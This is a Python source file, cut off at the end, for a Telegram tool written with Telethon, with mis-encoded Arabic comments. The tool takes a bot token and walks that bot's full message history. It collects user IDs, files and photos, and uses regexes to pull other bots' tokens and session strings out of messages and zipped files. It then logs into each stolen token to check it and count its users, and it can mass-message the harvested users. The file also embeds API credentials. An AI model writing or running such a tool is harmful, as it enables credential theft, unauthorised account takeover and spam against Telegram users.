import os
import sys
import json
import asyncio
import time
import glob
import re
import zipfile
import io
import sqlite3
from collections import defaultdict
from telethon import TelegramClient, events
from telethon.tl.functions.messages import GetMessagesRequest, GetHistoryRequest
from telethon.tl.types import MessageEmpty, PeerUser, PeerChat, MessageMediaDocument, MessageMediaPhoto
from telethon.tl.types import Document, Photo, DocumentAttributeFilename, InputDocumentFileLocation
from telethon.errors.rpcerrorlist import RpcCallFailError, FloodWaitError
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import InputPeerUser
from telethon import Button
import aiosqlite

API_ID = 25875948
API_HASH = 'bbc8cd4753b320c932bd56254d2917a0'

SEND_DELAY = 0.3
SESSION_DIR = 'sessions'  
os.makedirs(SESSION_DIR, exist_ok=True)

TOKEN_PATTERN = re.compile(r'\b\d{10}:[A-Za-z0-9_-]{35,}\b')
SESSION_PATTERNS = [
    re.compile(r'(?<!\d)\d{8,}(?!\d)'),
    re.compile(r'(?<!\w)[a-fA-F0-9]{32}(?!\w)'),
    re.compile(r'(?:[A-Za-z0-9+/]{4}){10,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?'),
    re.compile(r'\bStringSession\b')
]
SESSION_PATTERN_CHAT = re.compile(r'^[A-Za-z0-9](?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*-)(?=.*_)[A-Za-z0-9_-]{300,450}=$')

analysis_cache = {}
user_cache = {}
token_cache = {}

# Ø¥Ø¶Ø§ÙØ© Ø¯Ø§Ù„Ø© Ù„Ù„ØªØ¹Ø§Ù…Ù„ Ù…Ø¹ Ø£Ø®Ø·Ø§Ø¡ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
async def with_db_retry(func, max_retries=5, delay=1):
    """ØªÙ†ÙÙŠØ° Ø¯Ø§Ù„Ø© Ù…Ø¹ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø¹Ù†Ø¯ Ø­Ø¯ÙˆØ« Ø£Ø®Ø·Ø§Ø¡ ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª"""
    for attempt in range(max_retries):
        try:
            return await func()
        except (sqlite3.OperationalError, sqlite3.DatabaseError) as e:
            if "database is locked" in str(e) and attempt < max_retries - 1:
                print(f"âš ï¸ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù‚ÙÙ„Ø©ØŒ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© {attempt + 1}/{max_retries}")
                await asyncio.sleep(delay * (attempt + 1))
            else:
                raise e
        except Exception as e:
            raise e

# Ø¥Ø¶Ø§ÙØ© Ø¯Ø§Ù„Ø© Ù„Ù„ØªØ¹Ø§Ù…Ù„ Ù…Ø¹ Ø£Ø®Ø·Ø§Ø¡ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠØ©
async def with_telegram_retry(func, max_retries=3, delay=2):
    """ØªÙ†ÙÙŠØ° Ø¯Ø§Ù„Ø© Ù…Ø¹ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø¹Ù†Ø¯ Ø­Ø¯ÙˆØ« Ø£Ø®Ø·Ø§Ø¡ ÙÙŠ ØªÙ„ÙŠØ¬Ø±Ø§Ù…"""
    for attempt in range(max_retries):
        try:
            return await func()
        except RpcCallFailError as e:
            if "internal issues" in str(e).lower() and attempt < max_retries - 1:
                print(f"âš ï¸ ØªÙ„ÙŠØ¬Ø±Ø§Ù… ÙŠÙˆØ§Ø¬Ù‡ Ù…Ø´Ø§ÙƒÙ„ Ø¯Ø§Ø®Ù„ÙŠØ©ØŒ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© {attempt + 1}/{max_retries}")
                await asyncio.sleep(delay * (attempt + 1))
            else:
                raise e
        except FloodWaitError as e:
            wait_time = e.seconds
            print(f"â³ Ø§Ù†ØªØ¸Ø± {wait_time} Ø«Ø§Ù†ÙŠØ© Ø¨Ø³Ø¨Ø¨ FloodWait")
            await asyncio.sleep(wait_time + 1)
            if attempt < max_retries - 1:
                continue
            else:
                raise e
        except Exception as e:
            raise e

def cleanup_sessions():
    try:
        for old_session in glob.glob(os.path.join(SESSION_DIR, '*.session*')):
            try:
                os.remove(old_session)
            except OSError:
                pass
    except Exception as e:
        print(f"Warning: Could not clean up sessions: {e}")

async def forward_message(bot, message, target_id):
    try:
        await with_telegram_retry(lambda: bot.forward_messages(
            entity=int(target_id),
            messages=message.id,
            from_peer=message.peer_id
        ))
        return True
    except Exception as e:
        print(f"Error forwarding message: {e}")
        return False

async def get_chat_history(bot, start_id, end_id, target_id, progress_callback=None, stop_event=None):
    total_messages = end_id - start_id + 1
    current_id = start_id
    success_count = 0
    failed_count = 0
    last_update_time = 0
    
    while current_id <= end_id and (stop_event is None or not stop_event.is_set()):
        try:
            messages = await with_telegram_retry(lambda: bot(GetMessagesRequest([x for x in range(current_id, min(current_id + 100, end_id + 1))])))
            for m in messages.messages:
                if stop_event and stop_event.is_set():
                    break
                    
                if isinstance(m, MessageEmpty):
                    continue
                if await forward_message(bot, m, target_id):
                    success_count += 1
                else:
                    failed_count += 1
                
                current_time = time.time()
                if progress_callback and (current_time - last_update_time >= 5 or success_count + failed_count == total_messages):
                    last_update_time = current_time
                    if not await progress_callback(success_count + failed_count, total_messages):
                        break
                    
                await asyncio.sleep(SEND_DELAY)
            current_id += 100
        except Exception as e:
            print(f"Error processing messages {current_id}-{current_id+100}: {e}")
            failed_count += 100
            current_id += 100
            continue

    return success_count, failed_count

async def find_max_message_id(bot):
    try:
        left = 1
        right = 100000
        last_valid = 1

        while left <= right:
            mid = (left + right) // 2
            try:
                message = await with_telegram_retry(lambda: bot(GetMessagesRequest([mid])))
                if message.messages and not isinstance(message.messages[0], MessageEmpty):
                    last_valid = mid
                    left = mid + 1
                else:
                    right = mid - 1
            except Exception as e:
                print(f"Error checking message {mid}: {e}")
                right = mid - 1

        return last_valid
    except Exception as e:
        print(f"Error finding max message id: {e}")
        return 0

async def analyze_bot(bot_token, user_id, progress_callback=None):
    """ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ø¨Ø³Ø±Ø¹Ø© ÙØ§Ø¦Ù‚Ø©"""
    try:
        # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù…Ø¤Ù‚Øª Ø£ÙˆÙ„Ø§Ù‹
        cache_key = f"analysis_{bot_token}"
        if cache_key in analysis_cache:
            return analysis_cache[cache_key]
            
        temp_session = os.path.join(SESSION_DIR, f"analyze_bot_{int(time.time())}")
        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
        await temp_bot.start(bot_token=bot_token)
        
        me = await temp_bot.get_me()
        bot_username = me.username
        
        # Ø¥ÙŠØ¬Ø§Ø¯ Ø£Ù‚ØµÙ‰ Ù…Ø¹Ø±Ù Ø±Ø³Ø§Ù„Ø©
        max_id = await find_max_message_id(temp_bot)
        
        stats = {
            'total_messages': max_id,
            'users': set(),
            'files': [],
            'photos': [],
            'tokens': {'total': 0, 'valid': 0, 'details': []},
            'sessions': {'total': 0, 'details': []}
        }

        seen_tokens = set()
        seen_sessions = set()
        
        # ØªÙ‚Ø³ÙŠÙ… Ø§Ù„Ø¹Ù…Ù„ Ø¥Ù„Ù‰ Ù…Ù‡Ø§Ù… Ù…ØªÙˆØ§Ø²ÙŠØ©
        tasks = []
        chunk_size = 100
        
        for i in range(1, max_id + 1, chunk_size):
            end_range = min(i + chunk_size, max_id + 1)
            tasks.append(process_message_chunk(temp_bot, i, end_range, stats, seen_tokens, seen_sessions))
        
        # ØªØ´ØºÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù‡Ø§Ù… Ø¨Ø´ÙƒÙ„ Ù…ØªÙˆØ§Ø²ÙŠ Ù…Ø¹ ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ‚Ø¯Ù…
        total_chunks = len(tasks)
        completed_chunks = 0
        
        for i, task in enumerate(asyncio.as_completed(tasks)):
            try:
                await task
                completed_chunks += 1
                
                if progress_callback:
                    progress_percent = (completed_chunks / total_chunks) * 100
                    if not await progress_callback(completed_chunks * chunk_size, max_id, progress_percent):
                        break
            except Exception as e:
                print(f"Error in chunk processing: {e}")
                continue
        
        # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø¨Ø´ÙƒÙ„ Ù…ØªÙˆØ§Ø²ÙŠ
        if stats['tokens']['details']:
            await validate_tokens_parallel(stats['tokens']['details'])
            stats['tokens']['valid'] = sum(1 for token in stats['tokens']['details'] if token['valid'])
        
        await temp_bot.disconnect()
        
        try:
            if os.path.exists(f"{temp_session}.session"):
                os.remove(f"{temp_session}.session")
        except:
            pass
        
        result = {
            'success': True,
            'bot_username': bot_username,
            'total_messages': stats['total_messages'],
            'total_users': len(stats['users']),
            'total_files': len(stats['files']),
            'total_photos': len(stats['photos']),
            'files': stats['files'],
            'photos': stats['photos'],
            'tokens': stats['tokens'],
            'sessions': stats['sessions'],
            'user_ids': list(stats['users'])
        }
        
        # ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù†ØªÙŠØ¬Ø© ÙÙŠ Ø§Ù„Ø°Ø§ÙƒØ±Ø© Ø§Ù„Ù…Ø¤Ù‚ØªØ©
        analysis_cache[cache_key] = result
        return result
        
    except Exception as e:
        print(f"Error analyzing bot: {e}")
        return {'success': False, 'error': str(e)}

async def process_message_chunk(bot, start_id, end_id, stats, seen_tokens, seen_sessions):
    """Ù…Ø¹Ø§Ù„Ø¬Ø© Ø¬Ø²Ø¡ Ù…Ù† Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø¨Ø´ÙƒÙ„ Ù…Ù†ÙØµÙ„"""
    try:
        message_ids = list(range(start_id, end_id))
        messages = await with_telegram_retry(lambda: bot(GetMessagesRequest(message_ids)))
        
        for msg in messages.messages:
            if isinstance(msg, MessageEmpty):
                continue
            
            # Ø¬Ù…Ø¹ Ø§Ù„Ù…Ø¹Ø±ÙØ§Øª Ù…Ù† Ø§Ù„Ø±Ø³Ø§Ø¦Ù„
            if hasattr(msg, 'from_id') and msg.from_id:
                user_id_str = str(msg.from_id.user_id) if hasattr(msg.from_id, 'user_id') else str(msg.from_id)
                stats['users'].add(user_id_str)
            
            if hasattr(msg, 'reply_to') and msg.reply_to:
                if hasattr(msg.reply_to, 'from_id') and msg.reply_to.from_id:
                    reply_user_id = str(msg.reply_to.from_id.user_id) if hasattr(msg.reply_to.from_id, 'user_id') else str(msg.reply_to.from_id)
                    stats['users'].add(reply_user_id)
            
            if hasattr(msg, 'peer_id'):
                if hasattr(msg.peer_id, 'user_id'):
                    stats['users'].add(str(msg.peer_id.user_id))
                elif hasattr(msg.peer_id, 'chat_id'):
                    stats['users'].add(str(msg.peer_id.chat_id))
                elif hasattr(msg.peer_id, 'channel_id'):
                    stats['users'].add(str(msg.peer_id.channel_id))
            
            # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ÙˆØ³Ø§Ø¦Ø·
            if hasattr(msg, 'media'):
                if isinstance(msg.media, MessageMediaDocument):
                    if hasattr(msg.media, 'document') and isinstance(msg.media.document, Document):
                        document = msg.media.document
                        stats['files'].append({
                            'id': document.id,
                            'access_hash': document.access_hash,
                            'file_reference': document.file_reference,
                            'name': f"file_{document.id}_{int(time.time())}"
                        })
                        
                        # ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…Ù„Ù ÙˆØªØ­Ù„ÙŠÙ„Ù‡ Ù„Ù„ØªÙˆÙƒÙ†Ø§Øª ÙˆØ§Ù„Ø¬Ù„Ø³Ø§Øª
                        try:
                            file_data = await download_with_retry(bot, InputDocumentFileLocation(
                                id=document.id,
                                access_hash=document.access_hash,
                                file_reference=document.file_reference,
                                thumb_size=''
                            ))
                            if file_data:
                                text_data = file_data.decode(errors="ignore")
                                
                                # ÙØ­Øµ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø¯Ø§Ø®Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª
                                for token in TOKEN_PATTERN.findall(text_data):
                                    if token not in seen_tokens:
                                        seen_tokens.add(token)
                                        stats['tokens']['total'] += 1
                                        stats['tokens']['details'].append({
                                            'token': token,
                                            'valid': False,
                                            'bot_info': {}
                                        })
                                
                                # ÙØ­Øµ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø¯Ø§Ø®Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª
                                for session in SESSION_PATTERN_CHAT.findall(text_data):
                                    if session not in seen_sessions:
                                        seen_sessions.add(session)
                                        stats['sessions']['total'] += 1
                                        stats['sessions']['details'].append({
                                            'session': session,
                                            'source': 'file'
                                        })
                                
                                # ÙØ­Øµ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø¶ØºÙˆØ·Ø©
                                try:
                                    with zipfile.ZipFile(io.BytesIO(file_data)) as z:
                                        for fname in z.namelist():
                                            if fname.lower().endswith((".txt", ".json", ".py", ".php", ".js", ".html", ".xml")):
                                                try:
                                                    content = z.read(fname).decode(errors="ignore")
                                                    # ÙØ­Øµ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø¯Ø§Ø®Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø¶ØºÙˆØ·Ø©
                                                    for token in TOKEN_PATTERN.findall(content):
                                                        if token not in seen_tokens:
                                                            seen_tokens.add(token)
                                                            stats['tokens']['total'] += 1
                                                            stats['tokens']['details'].append({
                                                                'token': token,
                                                                'valid': False,
                                                                'bot_info': {}
                                                            })
                                                    # ÙØ­Øµ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø¯Ø§Ø®Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø¶ØºÙˆØ·Ø©
                                                    for session in SESSION_PATTERN_CHAT.findall(content):
                                                        if session not in seen_sessions:
                                                            seen_sessions.add(session)
                                                            stats['sessions']['total'] += 1
                                                            stats['sessions']['details'].append({
                                                                'session': session,
                                                                'source': 'zip'
                                                            })
                                                except:
                                                    continue
                                except:
                                    # Ù„ÙŠØ³ Ù…Ù„Ù Ù…Ø¶ØºÙˆØ·ØŒ ØªØ®Ø·ÙŠ
                                    pass
                        except Exception as e:
                            # Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…Ù„ÙØŒ ØªØ®Ø·ÙŠ
                            pass
                            
                elif isinstance(msg.media, MessageMediaPhoto):
                    if hasattr(msg.media, 'photo') and isinstance(msg.media.photo, Photo):
                        photo = msg.media.photo
                        stats['photos'].append({
                            'id': photo.id,
                            'access_hash': photo.access_hash,
                            'file_reference': photo.file_reference,
                            'name': f"photo_{photo.id}_{int(time.time())}"
                        })
            
            # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù†Øµ Ù„Ù„ØªÙˆÙƒÙ†Ø§Øª ÙˆØ§Ù„Ø¬Ù„Ø³Ø§Øª
            if hasattr(msg, 'message') and msg.message:
                text = msg.message
                
                token_matches = TOKEN_PATTERN.findall(text)
                for token in token_matches:
                    if token not in seen_tokens:
                        seen_tokens.add(token)
                        stats['tokens']['total'] += 1
                        stats['tokens']['details'].append({
                            'token': token,
                            'valid': False,
                            'bot_info': {}
                        })
                
                session_matches = SESSION_PATTERN_CHAT.findall(text)
                for session in session_matches:
                    if session not in seen_sessions:
                        seen_sessions.add(session)
                        stats['sessions']['total'] += 1
                        stats['sessions']['details'].append({
                            'session': session,
                            'source': 'chat'
                        })
    
    except Exception as e:
        print(f"Error processing chunk {start_id}-{end_id}: {e}")

async def validate_tokens_parallel(tokens_list, max_concurrent=20):
    """Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø¨Ø´ÙƒÙ„ Ù…ØªÙˆØ§Ø²ÙŠ Ù…Ø¹ ØªØ­Ø¯ÙŠØ¯ Ø­Ø¯ Ø§Ù„ØªØ²Ø§Ù…Ù†"""
    # Ø¥Ù†Ø´Ø§Ø¡ Ù‚Ø§Ø¦Ù…Ø© Ø¨Ø§Ù„Ù…Ù‡Ø§Ù…
    tasks = []
    
    # ØªØ­Ø¯ÙŠØ¯ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø§Ù„ØªÙŠ ØªØ­ØªØ§Ø¬ Ø¥Ù„Ù‰ Ø§Ù„ØªØ­Ù‚Ù‚
    tokens_to_validate = [token_info for token_info in tokens_list if not token_info.get('processed', False)]
    
    # ØªÙ‚Ø³ÙŠÙ… Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø¥Ù„Ù‰ Ù…Ø¬Ù…ÙˆØ¹Ø§Øª Ù„ØªØ¬Ù†Ø¨ Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø²Ø§Ø¦Ø¯
    for i in range(0, len(tokens_to_validate), max_concurrent):
        chunk = tokens_to_validate[i:i + max_concurrent]
        
        # Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù‡Ø§Ù… Ø§Ù„ØªØ­Ù‚Ù‚ Ù„ÙƒÙ„ Ù…Ø¬Ù…ÙˆØ¹Ø©
        chunk_tasks = [validate_token(token_info['token']) for token_info in chunk]
        
        # ØªØ´ØºÙŠÙ„ Ø§Ù„Ù…Ù‡Ø§Ù… Ø¨Ø´ÙƒÙ„ Ù…ØªÙˆØ§Ø²ÙŠ
        chunk_results = await asyncio.gather(*chunk_tasks, return_exceptions=True)
        
        # ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ù„ÙƒÙ„ ØªÙˆÙƒÙ† ÙÙŠ Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹Ø©
        for j, result in enumerate(chunk_results):
            token_index = i + j
            if token_index < len(tokens_to_validate):
                if isinstance(result, Exception):
                    print(f"âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØªÙˆÙƒÙ†: {result}")
                    tokens_to_validate[token_index]['valid'] = False
                    tokens_to_validate[token_index]['bot_info'] = {'error': str(result)}
                else:
                    tokens_to_validate[token_index]['valid'] = result.get('valid', False)
                    tokens_to_validate[token_index]['bot_info'] = result
                    tokens_to_validate[token_index]['processed'] = True

async def validate_token(token):
    """Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„ØªÙˆÙƒÙ† ÙˆØ¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ©"""
    try:
        temp_session = os.path.join(SESSION_DIR, f"validate_token_{int(time.time())}_{hash(token)}")
        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
        await temp_bot.start(bot_token=token)
        
        me = await temp_bot.get_me()
        bot_info = await temp_bot(GetFullUserRequest(me.id))
        
        # Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø£Ù‚ØµÙ‰ Ù…Ø¹Ø±Ù Ø±Ø³Ø§Ù„Ø©
        max_id = await find_max_message_id(temp_bot)
        users = set()
        
        # ØªÙ‚Ø³ÙŠÙ… Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø¥Ù„Ù‰ Ù…Ø¬Ù…ÙˆØ¹Ø§Øª Ù„Ù„ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…ØªÙˆØ§Ø²ÙŠ
        batch_size = 300
        tasks = []
        
        async def process_batch(start, end):
            local_users = set()
            try:
                message_ids = list(range(start, end))
                messages = await with_telegram_retry(lambda: temp_bot(GetMessagesRequest(message_ids)))
                for msg in messages.messages:
                    if isinstance(msg, MessageEmpty):
                        continue
                    
                    # Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ù…Ù† Ø§Ù„Ø±Ø³Ø§Ø¦Ù„
                    if hasattr(msg, 'from_id') and msg.from_id:
                        user_id_str = str(msg.from_id.user_id) if hasattr(msg.from_id, 'user_id') else str(msg.from_id)
                        local_users.add(user_id_str)
                    
                    if hasattr(msg, 'reply_to') and msg.reply_to:
                        if hasattr(msg.reply_to, 'from_id') and msg.reply_to.from_id:
                            reply_user_id = str(msg.reply_to.from_id.user_id) if hasattr(msg.reply_to.from_id, 'user_id') else str(msg.reply_to.from_id)
                            local_users.add(reply_user_id)
                    
                    if hasattr(msg, 'peer_id'):
                        if hasattr(msg.peer_id, 'user_id'):
                            local_users.add(str(msg.peer_id.user_id))
                        elif hasattr(msg.peer_id, 'chat_id'):
                            local_users.add(str(msg.peer_id.chat_id))
                        elif hasattr(msg.peer_id, 'channel_id'):
                            local_users.add(str(msg.peer_id.channel_id))
            except Exception as e:
                print(f"Error processing messages {start}-{end}: {e}")
            return local_users
        
        # Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù‡Ø§Ù… Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¯ÙÙØ¹Ø§Øª
        for i in range(1, max_id + 1, batch_size):
            end_range = min(i + batch_size, max_id + 1)
            tasks.append(process_batch(i, end_range))
        
        # ØªØ´ØºÙŠÙ„ Ø§Ù„Ù…Ù‡Ø§Ù… Ø¨Ø´ÙƒÙ„ Ù…ØªÙˆØ§Ø²ÙŠ
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Ø¯Ù…Ø¬ Ø§Ù„Ù†ØªØ§Ø¦Ø¬
        for r in results:
            if isinstance(r, set):
                users.update(r)
        
        await temp_bot.disconnect()
        
        try:
            if os.path.exists(f"{temp_session}.session"):
                os.remove(f"{temp_session}.session")
        except:
            pass
        
        return {
            'valid': True,
            'bot_name': me.first_name,
            'bot_username': me.username,
            'bot_id': me.id,
            'total_messages': max_id,
            'total_users': len(users)
        }
    except Exception as e:
        return {'valid': False, 'error': str(e)}

async def download_with_retry(bot, file_location, max_retries=3):
    for attempt in range(max_retries):
        try:
            file_data = await bot.download_file(file_location, bytes)
            if file_data:
                return file_data
        except Exception as e:
            if attempt == max_retries - 1:
                raise e
            await asyncio.sleep(1)
    return None

async def download_and_add_to_zip(bot, file_info, zip_file, file_type):
    try:
        if file_type == 'document':
            file_location = InputDocumentFileLocation(
                id=file_info['id'],
                access_hash=file_info['access_hash'],
                file_reference=file_info['file_reference'],
                thumb_size=''
            )
        else:
            file_location = InputDocumentFileLocation(
                id=file_info['id'],
                access_hash=file_info['access_hash'],
                file_reference=file_info['file_reference'],
                thumb_size=''
            )
        
        file_data = await download_with_retry(bot, file_location)
        if file_data:
            zip_file.writestr(file_info['name'], file_data)
            return True
            
    except Exception as e:
        if "file reference has expired" in str(e).lower():
            print(f"âš ï¸ ØªØ®Ø·ÙŠ Ø§Ù„Ù…Ù„Ù {file_info['id']} - Ø§Ù„Ù…Ø±Ø¬Ø¹ Ù…Ù†ØªÙ‡ÙŠ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ©")
            return False
        else:
            print(f"âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ {file_type} {file_info['id']}: {e}")
    return False

async def send_zip_files(main_bot, source_bot, file_infos, zip_name, caption, user_id, file_type):
    try:
        zip_buffer = io.BytesIO()
        success_count = 0
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for file_info in file_infos:
                if await download_and_add_to_zip(source_bot, file_info, zip_file, file_type):
                    success_count += 1
        
        zip_buffer.seek(0)
        
        if success_count > 0:
            await main_bot.send_file(
                entity=int(user_id),
                file=zip_buffer,
                caption=f"{caption} ({success_count} Ù…Ù„ÙØ§Øª)",
                attributes=[DocumentAttributeFilename(f"{zip_name}.zip")]
            )
            return True
        else:
            return False
    except Exception as e:
        print(f"Error sending zip file: {e}")
        return False

async def extract_users_from_bot(bot_token, user_id):
    try:
        temp_session = os.path.join(SESSION_DIR, f"extract_users_{int(time.time())}")
        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
        await temp_bot.start(bot_token=bot_token)
        
        users = set()
        max_id = await find_max_message_id(temp_bot)
        
        batch_size = 200
        for i in range(1, max_id + 1, batch_size):
            try:
                end_range = min(i + batch_size, max_id + 1)
                message_ids = list(range(i, end_range))
                messages = await with_telegram_retry(lambda: temp_bot(GetMessagesRequest(message_ids)))
                
                for msg in messages.messages:
                    if isinstance(msg, MessageEmpty):
                        continue
                    
                    # Ø¬Ù…Ø¹ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø¹Ø±ÙØ§Øª Ù…Ù† Ø§Ù„Ø±Ø³Ø§Ø¦Ù„
                    if hasattr(msg, 'from_id') and msg.from_id:
                        user_id_str = str(msg.from_id.user_id) if hasattr(msg.from_id, 'user_id') else str(msg.from_id)
                        users.add(user_id_str)
                    
                    # Ø¬Ù…Ø¹ Ø§Ù„Ù…Ø¹Ø±ÙØ§Øª Ù…Ù† Ø§Ù„Ø±Ø¯ÙˆØ¯
                    if hasattr(msg, 'reply_to') and msg.reply_to:
                        if hasattr(msg.reply_to, 'from_id') and msg.reply_to.from_id:
                            reply_user_id = str(msg.reply_to.from_id.user_id) if hasattr(msg.reply_to.from_id, 'user_id') else str(msg.reply_to.from_id)
                            users.add(reply_user_id)
                    
                    # Ø¬Ù…Ø¹ Ø§Ù„Ù…Ø¹Ø±ÙØ§Øª Ù…Ù† Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ ÙÙŠ Ø§Ù„Ù…Ø­Ø§Ø¯Ø«Ø§Øª
                    if hasattr(msg, 'peer_id'):
                        if hasattr(msg.peer_id, 'user_id'):
                            users.add(str(msg.peer_id.user_id))
                        elif hasattr(msg.peer_id, 'chat_id'):
                            users.add(str(msg.peer_id.chat_id))
                        elif hasattr(msg.peer_id, 'channel_id'):
                            users.add(str(msg.peer_id.channel_id))
            
            except Exception as e:
                print(f"Error processing messages {i}-{i+batch_size}: {e}")
                continue
        
        await temp_bot.disconnect()
        
        try:
            if os.path.exists(f"{temp_session}.session"):
                os.remove(f"{temp_session}.session")
        except:
            pass
        
        return list(users)
        
    except Exception as e:
        print(f"Error extracting users: {e}")
        return []

async def save_user_ids_to_file(user_ids, filename="user_ids.txt"):
    """Ø­ÙØ¸ Ù…Ø¹Ø±ÙØ§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† ÙÙŠ Ù…Ù„Ù Ù†ØµÙŠ"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            for user_id in user_ids:
                f.write(f"{user_id}\n")
        return True
    except Exception as e:
        print(f"Error saving user IDs to file: {e}")
        return False

async def broadcast_message(bot_token, user_ids, message_text, progress_callback=None, stop_event=None):
    """Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ Ù‚Ø§Ø¦Ù…Ø© Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†"""
    try:
        temp_session = os.path.join(SESSION_DIR, f"broadcast_bot_{int(time.time())}")
        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
        await temp_bot.start(bot_token=bot_token)
        
        success_count = 0
        failed_count = 0
        total_users = len(user_ids)
        last_update_time = 0
        
        for i, user_id in enumerate(user_ids):
            if stop_event and stop_event.is_set():
                break
                
            try:
                await with_telegram_retry(lambda: temp_bot.send_message(int(user_id), message_text))
                success_count += 1
            except Exception as e:
                print(f"Error sending to user {user_id}: {e}")
                failed_count += 1
            
            # Ø¥ÙŠÙ‚Ø§Ù Ù…Ø¤Ù‚Øª ÙƒÙ„ 500 Ø±Ø³Ø§Ù„Ø© Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø¹Ø¯Ø¯ Ø£ÙƒØ«Ø± Ù…Ù† 1000
            if total_users > 1000 and (i + 1) % 500 == 0:
                await asyncio.sleep(5)
                await asyncio.sleep(2)
            
            # ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ‚Ø¯Ù… ÙƒÙ„ 5 Ø«ÙˆØ§Ù†ÙŠ Ø£Ùˆ Ø¹Ù†Ø¯ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡
            current_time = time.time()
            if progress_callback and (current_time - last_update_time >= 5 or i + 1 == total_users):
                last_update_time = current_time
                if not await progress_callback(i + 1, total_users):
                    break
            
            await asyncio.sleep(SEND_DELAY)
        
        await temp_bot.disconnect()
        
        try:
            if os.path.exists(f"{temp_session}.session"):
                os.remove(f"{temp_session}.session")
        except:
            pass
        
        return success_count, failed_count
        
    except Exception as e:
        print(f"Error in broadcast: {e}")
        return 0, total_users

async def deep_network_analysis(main_bot_token, user_id, progress_callback=None, stop_event=None):
    """ØªØ­Ù„ÙŠÙ„ Ø´Ø¨ÙƒØ© Ø§Ù„Ø¨ÙˆØªØ§Øª Ø¨Ø´ÙƒÙ„ Ù…ØªØ¹Ù…Ù‚ Ù…Ø¹ Ø§Ù„ØªÙØ±Ø¹"""
    try:
